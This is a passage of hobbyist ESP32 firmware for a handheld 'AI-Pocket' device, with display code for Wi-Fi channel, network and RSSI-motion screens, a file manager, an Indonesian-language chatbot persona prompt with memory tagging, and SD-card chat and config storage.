    int idx = (snifferHistoryIdx + i) % SNIFFER_HISTORY_LEN;
    int h = map(snifferHistory[idx], 0, maxVal, 0, 100);
    if(h > 0) canvas.drawFastVLine(i * 2, graphBase - h, h, 0x07FF); // Cyan lines
  }

  canvas.setTextColor(COLOR_TEXT);
  canvas.setTextSize(1);
  canvas.setCursor(10, 45);
  canvas.print("CH: "); canvas.print((millis() / 500) % 13 + 1);
  canvas.print(" | MAX: "); canvas.print(maxVal);

  canvas.setCursor(10, SCREEN_HEIGHT - 12);
  canvas.print("Scanning... L+R=Back");

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void drawNetScan() {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();

  canvas.fillRect(0, 15, SCREEN_WIDTH, 20, 0xFFE0); // Yellow/Amber
  canvas.setTextColor(COLOR_BG);
  canvas.setTextSize(2);
  canvas.setCursor(10, 18);
  canvas.print("NET SCANNER");

  if (WiFi.status() != WL_CONNECTED) {
    canvas.setTextColor(COLOR_ERROR);
    canvas.setCursor(10, 50);
    canvas.print("WiFi Disconnected!");
    tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
    return;
  }

  // For simplicity, we just list the current connection info and scan networks again but styled differently
  // Since real IP scan blocks for too long.
  // Unless we trigger it once.

  canvas.setTextColor(COLOR_TEXT);
  canvas.setTextSize(1);
  canvas.setCursor(10, 45);
  canvas.print("Local IP: "); canvas.print(WiFi.localIP());
  canvas.setCursor(10, 55);
  canvas.print("Gateway: "); canvas.print(WiFi.gatewayIP());
  canvas.setCursor(10, 65);
  canvas.print("Subnet: "); canvas.print(WiFi.subnetMask());

  canvas.drawFastHLine(0, 80, SCREEN_WIDTH, COLOR_BORDER);
  canvas.setCursor(10, 85);
  canvas.setTextColor(0x07FF);
  canvas.print("NEARBY APs (Passive):");

  int listY = 100;
  for(int i=0; i<min(networkCount, 5); i++) {
    canvas.setCursor(10, listY);
    canvas.setTextColor(COLOR_TEXT);
    canvas.print(networks[i].ssid.substring(0, 15));
    canvas.setCursor(120, listY);
    canvas.print(networks[i].rssi); canvas.print("dB");
    canvas.setCursor(170, listY);
    canvas.print(networks[i].encrypted ? "ENC" : "OPEN");
    listY += 12;
  }

  canvas.setTextColor(COLOR_DIM);
  canvas.setCursor(10, SCREEN_HEIGHT - 12);
  canvas.print("Scanning... L+R=Back");

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void drawFileManager() {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();

  canvas.fillRect(0, 15, SCREEN_WIDTH, 20, 0x7BEF); // Gray/Blue
  canvas.setTextColor(COLOR_BG);
  canvas.setTextSize(2);
  canvas.setCursor(10, 18);
  canvas.print("FILE MANAGER");

  if (!sdCardMounted) {
    canvas.setTextColor(COLOR_ERROR);
    canvas.setCursor(10, 50);
    canvas.print("SD Card Not Found!");
    tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
    return;
  }

  // Populate list once
  if (fileListCount == 0) {
    File root = SD.open("/");
    File file = root.openNextFile();
    while(file && fileListCount < 20) {
      String name = String(file.name());
      if (name.startsWith("/")) name = name.substring(1);
      fileList[fileListCount] = name;
      fileListCount++;
      file = root.openNextFile();
    }
    root.close();
  }

  int startY = 45;
  for(int i=0; i<5; i++) {
    int idx = i + fileListScroll;
    if (idx >= fileListCount) break;

    if (idx == fileListSelection) {
      canvas.fillRect(5, startY + (i*20), SCREEN_WIDTH-10, 18, COLOR_PRIMARY);
      canvas.setTextColor(COLOR_BG);
    } else {
      canvas.drawRect(5, startY + (i*20), SCREEN_WIDTH-10, 18, COLOR_BORDER);
      canvas.setTextColor(COLOR_TEXT);
    }

    canvas.setCursor(10, startY + (i*20) + 5);
    canvas.print(fileList[idx]);
  }

  canvas.setTextColor(COLOR_DIM);
  canvas.setCursor(10, SCREEN_HEIGHT - 12);
  canvas.print("UP/DN=Scroll | L+R=Back");

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void drawAboutScreen() {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();

  // Header
  canvas.fillRect(0, 0, SCREEN_WIDTH, 28, COLOR_PANEL);
  canvas.drawFastHLine(0, 28, SCREEN_WIDTH, COLOR_BORDER);
  canvas.drawBitmap(10, 4, icon_about, 24, 24, COLOR_PRIMARY);
  canvas.setTextColor(COLOR_TEXT);
  canvas.setTextSize(2);
  canvas.setCursor(45, 7);
  canvas.print("About This Device");

  int y = 40;

  // Project Info
  canvas.fillRoundRect(10, y, SCREEN_WIDTH - 20, 50, 8, COLOR_PANEL);
  canvas.drawRoundRect(10, y, SCREEN_WIDTH - 20, 50, 8, COLOR_BORDER);
  canvas.setTextSize(1);
  canvas.setTextColor(COLOR_PRIMARY);
  canvas.setCursor(20, y + 8);
  canvas.print("Project: AI-Pocket S3");
  canvas.setCursor(20, y + 20);
  canvas.print("Version: 2.2 (Hacker Edition)");
  canvas.setCursor(20, y + 32);
  canvas.print("Created by: Ihsan & Subaru");

  y += 55;

  // Device Info
  canvas.fillRoundRect(10, y, SCREEN_WIDTH - 20, 40, 8, COLOR_PANEL);
  canvas.drawRoundRect(10, y, SCREEN_WIDTH - 20, 40, 8, COLOR_BORDER);
  canvas.setCursor(20, y + 8);
  canvas.print("Chip: ESP32-S3 | RAM: 8MB PSRAM");
  canvas.setCursor(20, y + 20);
  canvas.print("Flash: 16MB | CPU: 240MHz");

  // Footer
  canvas.setTextColor(COLOR_DIM);
  canvas.setCursor(10, SCREEN_HEIGHT - 12);
  canvas.print("L+R = Back to Main Menu");

  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

void drawWiFiSonar() {
  unsigned long now = millis();

  if (now - lastSonarUpdate > 100) {
    int rssi = WiFi.RSSI();
    // Normalize RSSI (-30 to -90) to 0-100
    int val = constrain(map(rssi, -90, -30, 0, 100), 0, 100);

    // Calculate variance/delta
    int delta = abs(val - lastSonarRSSI);
    lastSonarRSSI = val;

    sonarHistory[sonarHistoryIdx] = delta;
    sonarHistoryIdx = (sonarHistoryIdx + 1) % SONAR_HISTORY_LEN;

    if (delta > 15) sonarAlert = true; // Threshold for motion
    else sonarAlert = false;

    lastSonarUpdate = now;
  }

  canvas.fillScreen(COLOR_BG);
  drawStatusBar();

  // Header
  uint16_t headerColor = sonarAlert ? 0xF800 : 0x07E0; // Red if Alert, Green normal
  canvas.fillRect(0, 15, SCREEN_WIDTH, 20, headerColor);
  canvas.setTextColor(COLOR_BG);
  canvas.setTextSize(2);
  canvas.setCursor(10, 18);
  canvas.print(sonarAlert ? "MOTION DETECTED!" : "WIFI SONAR ACTIVE");

  if (WiFi.status() != WL_CONNECTED) {
    canvas.setTextColor(COLOR_ERROR);
    canvas.setCursor(10, 50);
    canvas.print("Connect WiFi first!");
    tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
    return;
  }

  // Draw Graph (Variance)
  int graphBase = SCREEN_HEIGHT - 10;
  for(int i=0; i<SONAR_HISTORY_LEN; i++) {
    int idx = (sonarHistoryIdx + i) % SONAR_HISTORY_LEN;
    int h = sonarHistory[idx] * 3; // Scale up
    if (h > 0) canvas.drawFastVLine(i * 2, graphBase - h, h, 0x07FF);
  }

  canvas.setTextColor(COLOR_DIM);
  canvas.setTextSize(1);
  canvas.setCursor(10, 45);
  canvas.print("Target: "); canvas.print(WiFi.SSID());
  canvas.setCursor(10, SCREEN_HEIGHT - 12);
  canvas.print("RSSI Delta Graph | L+R = Back");
  
  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
}

ConversationContext extractEnhancedContext() {
  ConversationContext ctx;
  ctx.totalInteractions = chatMessageCount;
  
  if (chatHistory.length() > MAX_CONTEXT_SEND) {
    int startPos = chatHistory.length() - MAX_CONTEXT_SEND;
    int separatorPos = chatHistory.indexOf("---\n", startPos);
    if (separatorPos != -1) {
      startPos = separatorPos + 4;
    }
    ctx.fullHistory = chatHistory.substring(startPos);
  } else {
    ctx.fullHistory = chatHistory;
  }
  
  String lowerHistory = chatHistory;
  lowerHistory.toLowerCase();
  
  if (lowerHistory.indexOf("nama") != -1) {
    int pos = lowerHistory.indexOf("nama");
    String segment = chatHistory.substring(max(0, pos - 50), min((int)chatHistory.length(), pos + 150));
    if (segment.indexOf("nama saya") != -1 || segment.indexOf("namaku") != -1 || 
        segment.indexOf("nama aku") != -1 || segment.indexOf("panggil") != -1) {
      ctx.userInfo += "[USER_NAME_MENTIONED] ";
    }
  }
  
  if (lowerHistory.indexOf("suka") != -1 || lowerHistory.indexOf("hobi") != -1 || 
      lowerHistory.indexOf("favorit") != -1 || lowerHistory.indexOf("senang") != -1 ||
      lowerHistory.indexOf("nonton") != -1 || lowerHistory.indexOf("main") != -1) {
    ctx.userInfo += "[INTERESTS_DISCUSSED] ";
  }
  
  if (lowerHistory.indexOf("tinggal") != -1 || lowerHistory.indexOf("rumah") != -1 ||
      lowerHistory.indexOf("kota") != -1 || lowerHistory.indexOf("daerah") != -1 ||
      lowerHistory.indexOf("tempat") != -1) {
    ctx.userInfo += "[LOCATION_MENTIONED] ";
  }
  
  if (lowerHistory.indexOf("kerja") != -1 || lowerHistory.indexOf("sekolah") != -1 ||
      lowerHistory.indexOf("kuliah") != -1 || lowerHistory.indexOf("kantor") != -1 ||
      lowerHistory.indexOf("universitas") != -1 || lowerHistory.indexOf("kelas") != -1) {
    ctx.userInfo += "[WORK_EDUCATION_DISCUSSED] ";
  }
  
  if (lowerHistory.indexOf("pacar") != -1 || lowerHistory.indexOf("teman") != -1 ||
      lowerHistory.indexOf("keluarga") != -1 || lowerHistory.indexOf("ortu") != -1 ||
      lowerHistory.indexOf("adik") != -1 || lowerHistory.indexOf("kakak") != -1) {
    ctx.userInfo += "[RELATIONSHIPS_MENTIONED] ";
  }
  
  String recentMsgs = getRecentChatContext(10);
  if (recentMsgs.indexOf("musik") != -1 || recentMsgs.indexOf("band") != -1 ||
      recentMsgs.indexOf("lagu") != -1 || recentMsgs.indexOf("drum") != -1) {
    ctx.recentTopics += "[MUSIC] ";
  }
  if (recentMsgs.indexOf("game") != -1 || recentMsgs.indexOf("main") != -1) {
    ctx.recentTopics += "[GAMING] ";
  }
  if (recentMsgs.indexOf("kerja") != -1 || recentMsgs.indexOf("project") != -1) {
    ctx.recentTopics += "[WORK] ";
  }
  
  int sadCount = 0, happyCount = 0, stressCount = 0;
  String recentEmotional = getRecentChatContext(5);
  String lowerRecent = recentEmotional;
  lowerRecent.toLowerCase();
  
  if (lowerRecent.indexOf("sedih") != -1) sadCount++;
  if (lowerRecent.indexOf("galau") != -1) sadCount++;
  if (lowerRecent.indexOf("susah") != -1) sadCount++;
  if (lowerRecent.indexOf("bingung") != -1) stressCount++;
  if (lowerRecent.indexOf("stress") != -1) stressCount++;
  if (lowerRecent.indexOf("cape") != -1) stressCount++;
  if (lowerRecent.indexOf("senang") != -1) happyCount++;
  if (lowerRecent.indexOf("bahagia") != -1) happyCount++;
  if (lowerRecent.indexOf("seru") != -1) happyCount++;
  if (lowerRecent.indexOf("haha") != -1) happyCount++;
  if (lowerRecent.indexOf("hehe") != -1) happyCount++;
  
  if (sadCount > 1) {
    ctx.emotionalPattern = "[MOOD_DOWN] User sepertinya sedang down. ";
  } else if (stressCount > 1) {
    ctx.emotionalPattern = "[MOOD_STRESSED] User sepertinya sedang stress. ";
  } else if (happyCount > 1) {
    ctx.emotionalPattern = "[MOOD_HAPPY] User terlihat ceria. ";
  }
  
  ctx.lastConversation = getRecentChatContext(3);
  return ctx;
}

String buildEnhancedPrompt(String currentMessage) {
  ConversationContext ctx = extractEnhancedContext();
  String prompt = "";
  
  prompt += "=== IDENTITY & PERSONALITY ===\n";
  if (currentAIMode == MODE_SUBARU) {
    prompt += AI_SYSTEM_PROMPT_SUBARU;
  } else {
    prompt += AI_SYSTEM_PROMPT_STANDARD;
  }
  prompt += "\n\n";
  
  if (currentAIMode == MODE_SUBARU && ctx.totalInteractions > 0) {
    prompt += "=== CONVERSATION STATISTICS ===\n";
    prompt += "Total percakapan dengan user: " + String(ctx.totalInteractions) + " pesan\n";
    prompt += "History size: " + String(chatHistory.length()) + " bytes\n";
    
    if (ctx.userInfo.length() > 0) {
      prompt += "Info yang kamu tahu tentang user: " + ctx.userInfo + "\n";
    }
    if (ctx.recentTopics.length() > 0) {
      prompt += "Topik yang sering dibahas: " + ctx.recentTopics + "\n";
    }
    if (ctx.emotionalPattern.length() > 0) {
      prompt += "Emotional state: " + ctx.emotionalPattern + "\n";
    }
    prompt += "\n";
  }
  
  if (currentAIMode == MODE_SUBARU && ctx.fullHistory.length() > 0) {
    prompt += "=== COMPLETE CONVERSATION HISTORY ===\n";
    prompt += "(Kamu HARUS membaca dan mengingat SEMUA percakapan ini)\n\n";
    prompt += ctx.fullHistory;
    prompt += "\n\n";
  }
  
  prompt += "=== PESAN USER SEKARANG ===\n";
  prompt += currentMessage;
  prompt += "\n\n";
  
  if (currentAIMode == MODE_SUBARU) {
    prompt += "=== CRITICAL INSTRUCTIONS ===\n";
    prompt += "1. BACA seluruh history di atas dengan teliti.\n";
    prompt += "2. INGAT semua detail penting yang pernah user ceritakan.\n";
    prompt += "3. Kalau user menyebut sesuatu yang pernah dibahas, TUNJUKKAN kamu ingat dengan specific reference.\n";
    prompt += "4. Gunakan nama user (jika sudah disebutkan di history).\n";
    prompt += "5. Respons harus natural, personal, dan show that you remember past conversations.\n";
    prompt += "6. Jangan bilang 'sepertinya kamu pernah bilang' - kamu TAHU PASTI dari history.\n";
    prompt += "7. Track progress atau perubahan dari topik recurring.\n";
    prompt += "8. Bicaralah seperti teman dekat yang BENAR-BENAR kenal user dari percakapan-percakapan sebelumnya.\n\n";
    prompt += "Sekarang jawab pesan user dengan personality Subaru Awa dan FULL MEMORY dari history:";
  } else {
    prompt += "=== INSTRUCTIONS ===\n";
    prompt += "Jawab pertanyaan user dengan jelas, informatif, dan helpful. ";
    prompt += "Gunakan format yang terstruktur jika diperlukan.";
  }
  
  return prompt;
}

// ============ SD CARD CHAT FUNCTIONS ============
bool initSDChatFolder() {
  if (!sdCardMounted) return false;
  if (!SD.exists(AI_CHAT_FOLDER)) {
    if (SD.mkdir(AI_CHAT_FOLDER)) {
      Serial.println("✓ Created /ai_chat folder");
      return true;
    } else {
      Serial.println("✗ Failed to create /ai_chat folder");
      return false;
    }
  }
  Serial.println("✓ /ai_chat folder exists");
  return true;
}

void loadChatHistoryFromSD() {
  chatHistory = "";
  chatMessageCount = 0;
  
  if (!sdCardMounted) return;
  
  SPI.end();
  SPI.begin(SDCARD_SCK, SDCARD_MISO, SDCARD_MOSI, SDCARD_CS);
  delay(10);
  
  if (!SD.begin(SDCARD_CS)) {
    SPI.end();
    SPI.begin(TFT_SCLK, TFT_MISO, TFT_MOSI, TFT_CS);
    return;
  }
  
  if (!initSDChatFolder()) {
    SPI.end();
    SPI.begin(TFT_SCLK, TFT_MISO, TFT_MOSI, TFT_CS);
    return;
  }
  
  if (!SD.exists(CHAT_HISTORY_FILE)) {
    SPI.end();
    SPI.begin(TFT_SCLK, TFT_MISO, TFT_MOSI, TFT_CS);
    return;
  }
  
  File file = SD.open(CHAT_HISTORY_FILE, FILE_READ);
  if (!file) {
    SPI.end();
    SPI.begin(TFT_SCLK, TFT_MISO, TFT_MOSI, TFT_CS);
    return;
  }
  
  while (file.available() && chatHistory.length() < MAX_HISTORY_SIZE) {
    chatHistory += (char)file.read();
  }
  file.close();
  
  int userCount = 0;
  int pos = 0;
  while ((pos = chatHistory.indexOf("User:", pos)) != -1) {
    userCount++;
    pos += 5;
  }
  chatMessageCount = userCount;
  
  SPI.end();
  SPI.begin(TFT_SCLK, TFT_MISO, TFT_MOSI, TFT_CS);
  SPI.setFrequency(40000000);
}

void appendChatToSD(String userText, String aiText) {
  if (!sdCardMounted) return;
  
  SPI.end();
  SPI.begin(SDCARD_SCK, SDCARD_MISO, SDCARD_MOSI, SDCARD_CS);
  delay(10);
  
  if (!SD.begin(SDCARD_CS)) {
    SPI.end();
    SPI.begin(TFT_SCLK, TFT_MISO, TFT_MOSI, TFT_CS);
    return;
  }
  
  if (!initSDChatFolder()) {
    SPI.end();
    SPI.begin(TFT_SCLK, TFT_MISO, TFT_MOSI, TFT_CS);
    return;
  }
  
  struct tm timeinfo;
  String timestamp = "[NO-TIME]";
  String date = "";
  String time = "";
  
  if (getLocalTime(&timeinfo, 0)) {
    char timeBuff[32];
    sprintf(timeBuff, "[%04d-%02d-%02d %02d:%02d:%02d]", 
            timeinfo.tm_year + 1900, timeinfo.tm_mon + 1, timeinfo.tm_mday,
            timeinfo.tm_hour, timeinfo.tm_min, timeinfo.tm_sec);
    timestamp = String(timeBuff);
    
    char dateBuff[16];
    sprintf(dateBuff, "%04d-%02d-%02d", timeinfo.tm_year + 1900, timeinfo.tm_mon + 1, timeinfo.tm_mday);
    date = String(dateBuff);
    
    char timeBuff2[16];
    sprintf(timeBuff2, "%02d:%02d", timeinfo.tm_hour, timeinfo.tm_min);
    time = String(timeBuff2);
  }
  
  String sdEntry = "\n========================================\n";
  sdEntry += "TIMESTAMP: " + timestamp + "\n";
  if (date.length() > 0) {
    sdEntry += "DATE: " + date + " | TIME: " + time + "\n";
  }
  sdEntry += "MESSAGE #" + String(chatMessageCount + 1) + "\n";
  sdEntry += "========================================\n";
  sdEntry += "USER: " + userText + "\n";
  sdEntry += "----------------------------------------\n";
  sdEntry += "SUBARU: " + aiText + "\n";
  sdEntry += "========================================\n\n";
  
  File file = SD.open(CHAT_HISTORY_FILE, FILE_APPEND);
  if (!file) {
    file = SD.open(CHAT_HISTORY_FILE, FILE_WRITE);
    if (!file) {
      SPI.end();
      SPI.begin(TFT_SCLK, TFT_MISO, TFT_MOSI, TFT_CS);
      return;
    }
  }
  
  file.print(sdEntry);
  file.flush();
  file.close();
  
  String memoryEntry = timestamp + "\nUser: " + userText + "\nSubaru: " + aiText + "\n---\n";
  
  if (chatHistory.length() + memoryEntry.length() >= MAX_HISTORY_SIZE) {
    int trimPoint = chatHistory.length() * 0.3;
    int separatorPos = chatHistory.indexOf("---\n", trimPoint);
    if (separatorPos != -1) {
      chatHistory = chatHistory.substring(separatorPos + 4);
    }
  }
  
  chatHistory += memoryEntry;
  chatMessageCount++;
  
  SPI.end();
  SPI.begin(TFT_SCLK, TFT_MISO, TFT_MOSI, TFT_CS);
  SPI.setFrequency(40000000);
}

void clearChatHistory() {
  chatHistory = "";
  chatMessageCount = 0;
  
  if (!sdCardMounted) {
    showStatus("SD not ready", 1500);
    return;
  }
  
  SPI.end();
  SPI.begin(SDCARD_SCK, SDCARD_MISO, SDCARD_MOSI, SDCARD_CS);
  delay(10);
  
  if (!SD.begin(SDCARD_CS)) {
    SPI.end();
    SPI.begin(TFT_SCLK, TFT_MISO, TFT_MOSI, TFT_CS);
    showStatus("SD init failed", 1500);
    return;
  }
  
  if (SD.exists(CHAT_HISTORY_FILE)) {
    if (SD.remove(CHAT_HISTORY_FILE)) {
      showStatus("Chat history\ncleared!", 1500);
    } else {
      showStatus("Delete failed!", 1500);
    }
  } else {
    showStatus("No history\nfound", 1500);
  }
  
  SPI.end();
  SPI.begin(TFT_SCLK, TFT_MISO, TFT_MOSI, TFT_CS);
  SPI.setFrequency(40000000);
}

String getRecentChatContext(int maxMessages) {
  String context = "";
  int count = 0;
  int pos = chatHistory.length();
  
  while (count < maxMessages && pos > 0) {
    int prevSep = chatHistory.lastIndexOf("---\n", pos - 1);
    if (prevSep == -1) break;
    
    String segment = chatHistory.substring(prevSep + 4, pos);
    int tsEnd = segment.indexOf("\n");
    if (tsEnd != -1) {
      segment = segment.substring(tsEnd + 1);
    }
    
    context = segment + context;
    pos = prevSep;
    count++;
  }
  
  return context;
}

// ============ CONFIGURATION SYSTEM (SD .aip) ============
void loadConfig() {
  // Try SD first
  if (sdCardMounted && SD.exists(CONFIG_FILE)) {
    File file = SD.open(CONFIG_FILE, FILE_READ);
    if (file) {
      JsonDocument doc;
      DeserializationError error = deserializeJson(doc, file);
      if (!error) {
        sysConfig.ssid = doc["wifi"]["ssid"] | "";
        sysConfig.password = doc["wifi"]["pass"] | "";
        sysConfig.espnowNick = doc["sys"]["nick"] | "ESP32";
        sysConfig.showFPS = doc["sys"]["fps"] | false;
        sysConfig.petHunger = doc["pet"]["hgr"] | 80.0f;
        sysConfig.petHappiness = doc["pet"]["hap"] | 80.0f;
        sysConfig.petEnergy = doc["pet"]["eng"] | 80.0f;
        sysConfig.petSleep = doc["pet"]["slp"] | false;

        // Sync to legacy globals if needed
        myNickname = sysConfig.espnowNick;
        showFPS = sysConfig.showFPS;
        myPet.hunger = sysConfig.petHunger;
        myPet.happiness = sysConfig.petHappiness;
        myPet.energy = sysConfig.petEnergy;
        myPet.isSleeping = sysConfig.petSleep;

        Serial.println("Config loaded from SD (.aip)");
        file.close();
        return;
      }
      file.close();
    }
  }

  // Fallback to NVS
  preferences.begin("app-config", true);
  sysConfig.ssid = preferences.getString("ssid", "");
  sysConfig.password = preferences.getString("password", "");
  sysConfig.espnowNick = preferences.getString("espnow_nick", "ESP32");
  sysConfig.showFPS = preferences.getBool("showFPS", false);
  preferences.end();

  preferences.begin("pet-data", true);
  sysConfig.petHunger = preferences.getFloat("hunger", 80.0f);
  sysConfig.petHappiness = preferences.getFloat("happy", 80.0f);
  sysConfig.petEnergy = preferences.getFloat("energy", 80.0f);
  sysConfig.petSleep = preferences.getBool("sleep", false);
  preferences.end();

  // Sync
  myNickname = sysConfig.espnowNick;
  showFPS = sysConfig.showFPS;
  myPet.hunger = sysConfig.petHunger;
  myPet.happiness = sysConfig.petHappiness;
  myPet.energy = sysConfig.petEnergy;
  myPet.isSleeping = sysConfig.petSleep;

  Serial.println("Config loaded from NVS");
}

void saveConfig() {
  // Update struct from globals
  sysConfig.espnowNick = myNickname;
  sysConfig.showFPS = showFPS;
  sysConfig.petHunger = myPet.hunger;
  sysConfig.petHappiness = myPet.happiness;
  sysConfig.petEnergy = myPet.energy;
  sysConfig.petSleep = myPet.isSleeping;
  // ssid/pass are updated directly

  if (sdCardMounted) {
    JsonDocument doc;
    doc["wifi"]["ssid"] = sysConfig.ssid;
    doc["wifi"]["pass"] = sysConfig.password;
    doc["sys"]["nick"] = sysConfig.espnowNick;
    doc["sys"]["fps"] = sysConfig.showFPS;
    doc["pet"]["hgr"] = sysConfig.petHunger;
    doc["pet"]["hap"] = sysConfig.petHappiness;
    doc["pet"]["eng"] = sysConfig.petEnergy;
    doc["pet"]["slp"] = sysConfig.petSleep;

    File file = SD.open(CONFIG_FILE, FILE_WRITE);
    if (file) {
      serializeJson(doc, file);
      file.close();
      Serial.println("Config saved to SD (.aip)");
    }
  }

  // Always backup to NVS for robustness
  preferences.begin("app-config", false);
  preferences.putString("ssid", sysConfig.ssid);
  preferences.putString("password", sysConfig.password);
  preferences.putString("espnow_nick", sysConfig.espnowNick);
  preferences.putBool("showFPS", sysConfig.showFPS);
  preferences.end();

  preferences.begin("pet-data", false);
  preferences.putFloat("hunger", sysConfig.petHunger);
  preferences.putFloat("happy", sysConfig.petHappiness);
  preferences.putFloat("energy", sysConfig.petEnergy);
  preferences.putBool("sleep", sysConfig.petSleep);
  preferences.end();
}

// Wrapper for legacy calls
void savePreferenceString(const char* key, String value) {
  if (String(key) == "ssid") sysConfig.ssid = value;
  if (String(key) == "password") sysConfig.password = value;
  if (String(key) == "espnow_nick") sysConfig.espnowNick = value;
  saveConfig();
}

// Add these to fix compilation
String loadPreferenceString(const char* key, String defaultValue) {
  if (String(key) == "ssid") return sysConfig.ssid.length() > 0 ? sysConfig.ssid : defaultValue;
  if (String(key) == "password") return sysConfig.password.length() > 0 ? sysConfig.password : defaultValue;
  if (String(key) == "espnow_nick") return sysConfig.espnowNick.length() > 0 ? sysConfig.espnowNick : defaultValue;
  return defaultValue;
}

bool loadPreferenceBool(const char* key, bool defaultValue) {
  if (String(key) == "showFPS") return sysConfig.showFPS;
  return defaultValue;
}

// ============ NEOPIXEL ============
void triggerNeoPixelEffect(uint32_t color, int duration) {
  neoPixelColor = color;
  pixels.setPixelColor(0, neoPixelColor);
  pixels.show();
  neoPixelEffectEnd = millis() + duration;
}

void updateNeoPixel() {
  if (neoPixelEffectEnd > 0 && millis() > neoPixelEffectEnd) {
    pixels.setPixelColor(0, 0);
    pixels.show();
    neoPixelEffectEnd = 0;
  }
}

// ============ LED PATTERNS ============
void ledQuickFlash() {
  digitalWrite(LED_BUILTIN, HIGH);
  delay(30);
  digitalWrite(LED_BUILTIN, LOW);
}

void ledSuccess() {
  for (int i = 0; i < 3; i++) {
    digitalWrite(LED_BUILTIN, HIGH);
    delay(100);
    digitalWrite(LED_BUILTIN, LOW);
    delay(100);
  }
}

void ledError() {
  for (int i = 0; i < 5; i++) {
    digitalWrite(LED_BUILTIN, HIGH);
    delay(80);
    digitalWrite(LED_BUILTIN, LOW);
    delay(80);
  }
}

// ============ STATUS BAR ============
void updateStatusBarData() {
  if (millis() - lastStatusBarUpdate > 1000) {
    lastStatusBarUpdate = millis();
    if (WiFi.status() == WL_CONNECTED) {
       cachedRSSI = WiFi.RSSI();
    } else {
       cachedRSSI = 0;
    }
    struct tm timeinfo;
    if (getLocalTime(&timeinfo, 0)) {
       char timeStringBuff[10];
       sprintf(timeStringBuff, "%02d:%02d", timeinfo.tm_hour, timeinfo.tm_min);
       cachedTimeStr = String(timeStringBuff);
    }
  }
}

void drawStatusBar() {
  canvas.setTextColor(COLOR_PRIMARY);
  canvas.setTextSize(1);
  if (cachedTimeStr.length() > 0) {
    canvas.setCursor(5, 2);
    canvas.print(cachedTimeStr);
  }
  
  if (sdCardMounted) {
    canvas.setCursor(45, 2);
    canvas.print("SD");
  }
  
  if (chatMessageCount > 0) {
    canvas.setCursor(65, 2);
    canvas.print("C:");
    canvas.print(chatMessageCount);
  }
  
  if (espnowInitialized) {
    canvas.setCursor(100, 2);
    canvas.print("ESP:");
    canvas.print(espnowPeerCount);
  }
  
  if (showFPS) {
    uint16_t fpsColor = COLOR_SUCCESS;
    if (perfFPS < 100) fpsColor = 0xFFE0; // Yellow
    if (perfFPS < 60) fpsColor = COLOR_ERROR;  // Red

    String fpsStr = String(perfFPS);
    int textWidth = (fpsStr.length() + 4) * 6; // "XXX FPS"
    int panelX = SCREEN_WIDTH - 35 - textWidth;

    canvas.fillRoundRect(panelX, 0, textWidth, 12, 3, COLOR_PANEL);
    canvas.drawRoundRect(panelX, 0, textWidth, 12, 3, COLOR_BORDER);

    canvas.setTextSize(1);
    canvas.setCursor(panelX + 4, 2);
    canvas.setTextColor(fpsColor);
    canvas.print(fpsStr);
    canvas.setTextColor(COLOR_SECONDARY);
    canvas.print(" FPS");
  }

  if (WiFi.status() == WL_CONNECTED) {
    int bars = 0;
    if (cachedRSSI > -55) bars = 4;
    else if (cachedRSSI > -65) bars = 3;
    else if (cachedRSSI > -75) bars = 2;
    else if (cachedRSSI > -85) bars = 1;
    int x = SCREEN_WIDTH - 25;
    int y = 8;
    for (int i = 0; i < 4; i++) {
      int h = (i + 1) * 2;
      if (i < bars) {
        canvas.fillRect(x + (i * 3), y - h + 2, 2, h, COLOR_ACCENT);
      } else {
        canvas.drawRect(x + (i * 3), y - h + 2, 2, h, COLOR_DIM);
      }
    }
  }
}

// ============ UTILITY FUNCTIONS ============
void showStatus(String message, int delayMs) {
  canvas.fillScreen(COLOR_BG);
  
  int boxW = 280;
  int boxH = 80;
  int boxX = (SCREEN_WIDTH - boxW) / 2;
  int boxY = (SCREEN_HEIGHT - boxH) / 2;
  
  canvas.drawRect(boxX, boxY, boxW, boxH, COLOR_PRIMARY);
  canvas.drawRect(boxX + 1, boxY + 1, boxW - 2, boxH - 2, COLOR_PRIMARY);
  
  canvas.setTextColor(COLOR_TEXT);
  canvas.setTextSize(2);
  
  int cursorY = boxY + 20;
  int cursorX = boxX + 10;
  String word = "";
  
  for (unsigned int i = 0; i < message.length(); i++) {
    char c = message.charAt(i);
    if (c == ' ' || c == '\n' || i == message.length() - 1) {
      if (i == message.length() - 1 && c != ' ' && c != '\n') word += c;
      canvas.setCursor(cursorX, cursorY);
      canvas.print(word);
      cursorX += (word.length() * 12);
      if (c == '\n' || cursorX > boxX + boxW - 20) {
        cursorY += 18;
        cursorX = boxX + 10;
      }
      word = "";
    } else {
      word += c;
    }
  }
  
  tft.drawRGBBitmap(0, 0, canvas.getBuffer(), SCREEN_WIDTH, SCREEN_HEIGHT);
  if (delayMs > 0) delay(delayMs);
}

void showProgressBar(String title, int percent) {
  canvas.fillScreen(COLOR_BG);
  drawStatusBar();
  
  canvas.setTextColor(COLOR_PRIMARY);
  canvas.setTextSize(2);
  int titleW = title.length() * 12;
  canvas.setCursor((SCREEN_WIDTH - titleW) / 2, 50);
  canvas.print(title);
  
  int barX = 40;
  int barY = 90;
  int barW = SCREEN_WIDTH - 80;
  int barH = 16;
  
  canvas.drawRect(barX, barY, barW, barH, COLOR_PRIMARY);
  
  int fillW = map(percent, 0, 100, 0, barW - 2);
  if (fillW > 0) {
    canvas.fillRect(barX + 1, barY + 1, fillW, barH - 2, COLOR_PRIMARY);
  }
  
  canvas.setTextSize(1);
  canvas.setTextColor(COLOR_TEXT);
  canvas.setCursor(SCREEN_WIDTH / 2 - 12, barY + 25);
  canvas.print(percent);
  canvas.print("%");
  
